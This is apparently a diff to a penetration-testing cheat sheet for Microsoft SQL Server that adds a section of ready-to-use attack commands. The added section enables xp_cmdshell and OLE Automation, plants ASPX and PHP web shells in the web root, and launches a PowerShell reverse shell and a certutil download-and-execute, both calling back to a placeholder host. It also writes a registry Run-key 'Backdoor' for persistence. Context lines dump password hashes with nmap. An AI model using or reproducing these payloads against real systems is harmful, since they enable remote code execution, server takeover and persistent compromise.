@@ -67,8 +67,108 @@ nmap -p 1433 --script ms-sql-dump-hashes --script-args mssqlusername='sa',mssqlp
 
 # Config backup download
 nmap -p 1433 --script ms-sql-config <target> --script-args mssqlusername='sa',mssqlpassword='pass'
+```
 
-# Commands
+## Commands
+
+```bash
+### Account Check
+SELECT servicename, service_account FROM sys.dm_server_services;
+
+Get-CimInstance Win32_Service | 
+Where-Object {$_.Name -like "MSSQL*"} | 
+Select Name, StartName
+
+### xp_cmdshell
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE; ( Enabled )
+
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE; ( Enabled )
+
+EXEC xp_cmdshell 'whoami';
+
+EXEC sp_configure 'xp_cmdshell', 0;
+RECONFIGURE; ( Disabled )
+
+EXEC xp_readerrorlog; ( Loglar )
+
+### OLE Automation
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+
+EXEC sp_configure 'Ole Automation Procedures', 1;
+RECONFIGURE;
+
+EXEC sp_configure 'Ole Automation Procedures';
+
+================ Basic File Operations (sp_OACreate) ================
+DECLARE @obj INT, @fso INT, @file INT, @hr INT
+EXEC @hr = sp_OACreate 'Scripting.FileSystemObject', @obj OUT
+EXEC @hr = sp_OAMethod @obj, 'CreateTextFile', @file OUT, 'C:\inetpub\wwwroot\shell.aspx', 2
+EXEC @hr = sp_OAMethod @file, 'Write', NULL, '<%@ Page Language="C#" %><% Process proc = new Process(); proc.StartInfo.FileName = Request["cmd"]; proc.StartInfo.Arguments = "/c " + Request["c"]; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; proc.Start(); Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>"); proc.WaitForExit(); %>'
+EXEC @hr = sp_OAMethod @file, 'Close'
+EXEC sp_OADestroy @file
+EXEC sp_OADestroy @obj
+
+================ Powershell ReverseShell ================
+DECLARE @obj INT, @com INT, @file INT, @hr INT, @src NVARCHAR(1000)
+SET @src = N'
+$client = new-object System.Net.Sockets.TCPClient("YOUR_IP",4444);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+    $sendback = (iex $data 2>&1 | Out-String );
+    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush()
+}
+$client.Close()'
+EXEC @hr = sp_OACreate 'Scripting.FileSystemObject', @obj OUT
+EXEC @hr = sp_OAMethod @obj, 'CreateTextFile', @file OUT, 'C:\Windows\Temp\rev.ps1', 2
+EXEC @hr = sp_OAMethod @file, 'Write', NULL, @src
+EXEC @hr = sp_OAMethod @file, 'Close'
+EXEC @hr = sp_OACreate 'WScript.Shell', @com OUT
+EXEC @hr = sp_OAMethod @com, 'Run', NULL, 'powershell.exe -ep bypass -f C:\Windows\Temp\rev.ps1'
+EXEC sp_OADestroy @com
+
+================ Download & Execute Payload ================
+DECLARE @obj INT, @com INT, @hr INT
+EXEC @hr = sp_OACreate 'WScript.Shell', @com OUT
+EXEC @hr = sp_OAMethod @com, 'Run', NULL, 
+    'certutil.exe -urlcache -split -f http://YOUR_IP/payload.exe C:\Windows\Temp\payload.exe && C:\Windows\Temp\payload.exe'
+EXEC sp_OADestroy @com
+
+================ PHP Webshell (Windows PHP) ================
+DECLARE @obj INT, @fso INT, @file INT, @hr INT
+EXEC @hr = sp_OACreate 'Scripting.FileSystemObject', @obj OUT
+EXEC @hr = sp_OAMethod @obj, 'CreateTextFile', @file OUT, 'C:\inetpub\wwwroot\cmd.php', 2
+EXEC @hr = sp_OAMethod @file, 'Write', NULL, '<?php echo shell_exec($_GET["c"]); ?>'
+EXEC @hr = sp_OAMethod @file, 'Close'
+EXEC sp_OADestroy @file
+EXEC sp_OADestroy @obj
+
+================ Advanced: WMI EXEC ================
+DECLARE @obj INT, @hr INT
+
+EXEC @hr = sp_OACreate 'WbemScripting.SWbemLocator', @obj OUT
+EXEC @hr = sp_OAMethod @obj, 'ConnectServer', @output OUT, '.', 'root\cimv2'
+EXEC @hr = sp_OAMethod @output, 'ExecQuery', @output OUT, 
+    'SELECT * FROM Win32_Process WHERE name=''cmd.exe'''
+EXEC sp_OADestroy @obj
+
+================ Registry Persistence ================
+DECLARE @obj INT, @hr INT
+EXEC @hr = sp_OACreate 'WScript.Shell', @obj OUT
+EXEC @hr = sp_OAMethod @obj, 'RegWrite', NULL, 
+    'HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Backdoor', 
+    'powershell -c "IEX (New-Object Net.WebClient).DownloadString(''http://YOUR_IP/backdoor.ps1'')"'
+EXEC sp_OADestroy @obj
+
+
+
 SELECT name FROM sys.databases;
 USE dbname;
 SELECT name FROM sys.tables;
